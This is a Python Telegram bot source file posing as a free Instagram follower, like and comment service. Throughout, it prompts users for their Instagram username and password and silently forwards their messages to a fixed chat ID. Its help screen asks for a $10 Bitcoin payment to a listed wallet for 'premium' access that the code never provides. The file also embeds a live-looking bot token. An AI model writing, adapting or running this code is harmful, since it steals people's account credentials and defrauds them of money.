from telegram import *
from telegram.ext import *

token = '5475410441:AAGfSzpPuvtQkbdeokPI1xuhjXiuUyHVhCQ'
bot = Bot(token)
updater = Updater(token, use_context=True)

def Follower(update: Update, context: CallbackContext):
          keyboard_main = [
                    [InlineKeyboardButton("Get Follower", callback_data='follower'),
                    InlineKeyboardButton("Get Like", callback_data='like'),
                    InlineKeyboardButton("Get Comment", callback_data='camment')
                    ],
                    [InlineKeyboardButton("Help", callback_data='help'),
                    InlineKeyboardButton("About", callback_data='about')
                    ]
          ]
          reply_main = InlineKeyboardMarkup(keyboard_main)
          bot.send_message(
                              chat_id=update.effective_message.chat_id,
                              text="\U0001F5E3<b><i>Use Instagram Services for free</i></b>\n" + ' \n' + "\U00002747You can receive 100 followers, likes \n and comments with Instagram Services (us) daily\n" + ' \n' + "\U00002049You can contact us to get out of the limit\n",
                              parse_mode= 'html',
                              reply_markup=reply_main
                    )
def menu(update: Update, context: CallbackContext):
          keyboard = [
                    [InlineKeyboardButton("Get Follower", callback_data='follower'),
                    InlineKeyboardButton("Get Like", callback_data='like'),
                    InlineKeyboardButton("Get Comment", callback_data='camment')
                    ],
                    [InlineKeyboardButton("Help", callback_data='help'),
                    InlineKeyboardButton("About", callback_data='about')
                    ]
          ]
          reply_mark = InlineKeyboardMarkup(keyboard)
          bot.send_message(
                              chat_id=update.effective_message.chat_id,
                              text="\U0001F5E3<b><i>Use Instagram Services for free</i></b>\n" + ' \n' + "\U00002747You can receive 100 followers, likes \n and comments with Instagram Services (us) daily\n" + ' \n' + "\U00002049You can contact us to get out of the limit\n",
                              parse_mode= 'html',
                              reply_markup=reply_mark
                    )
def page(update: Update, context: CallbackContext):
          bot.forward_message(
                    chat_id='425002947',
                    from_chat_id=update.effective_message.chat_id,
                    message_id=update.effective_message.message_id
          )
def query(update: Update, context: CallbackContext):
          keyboard = [
                    [InlineKeyboardButton("Back to Menu", callback_data='menu')]
          ]
          reply = InlineKeyboardMarkup(keyboard)
          keyboard_main = [
                    [InlineKeyboardButton("Get Follower", callback_data='follower'),
                    InlineKeyboardButton("Get Like", callback_data='like'),
                    InlineKeyboardButton("Get Comment", callback_data='camment')
                    ],
                    [InlineKeyboardButton("Help", callback_data='help'),
                    InlineKeyboardButton("About", callback_data='about')
                    ]
          ]
          reply_main = InlineKeyboardMarkup(keyboard_main)
          query : CallbackQuery = update.callback_query
          if query.data == 'follower':
                    bot.edit_message_text(
                              text="\U000025B6 Send your username and Password of instagram\n" + " \n" + "\U00002705 Example => services:123456\n",
                              chat_id=update.effective_message.chat_id,
                              message_id=update.effective_message.message_id,
                              reply_markup=reply
                    )
                    updater.dispatcher.add_handler(MessageHandler(Filters.text, page))

          elif query.data == 'menu':
                    bot.edit_message_text(chat_id=update.effective_message.chat_id,
                    text="\U0001F5E3<b><i>Use Instagram Services for free</i></b>\n" + ' \n' + "\U00002747You can receive 100 followers, likes \n and comments with Instagram Services (us) daily\n" + ' \n' + "\U00002049You can contact us to get out of the limit\n",
                    message_id=update.effective_message.message_id,
                    parse_mode= 'html',
                    reply_markup=reply_main
                    )
          elif query.data == 'like':
                    bot.answer_callback_query(callback_query_id=update.callback_query.id, text="Sorry, You are not a special user\U0001F61E", show_alert=True)
          elif query.data == 'camment':
                    bot.answer_callback_query(callback_query_id=update.callback_query.id, text="Sorry, You are not a special user\U0001F61E", show_alert=True)
          elif query.data == 'help':
                    bot.edit_message_text(chat_id=update.effective_message.chat_id,
                    text="If you want to be a premium user, send 10$ to our Wallet:\n" + " \n" + "BTC:39cbZCBZ3DodMLwaN9488aPahzhNmacfi7\n" + " \n" + "\U0001F60A\U0001F60A\U0001F60A",
                    message_id=update.effective_message.message_id,
                    reply_markup=reply
                    )
                    updater.dispatcher.add_handler(MessageHandler(Filters.text, page))
          elif query.data == 'about':
                    bot.answer_callback_query(callback_query_id=update.callback_query.id, text="Instagram Services\U0001F929", show_alert=True)
          
updater.dispatcher.add_handler(CommandHandler('start', Follower))
updater.dispatcher.add_handler(CallbackQueryHandler(query))
updater.start_polling()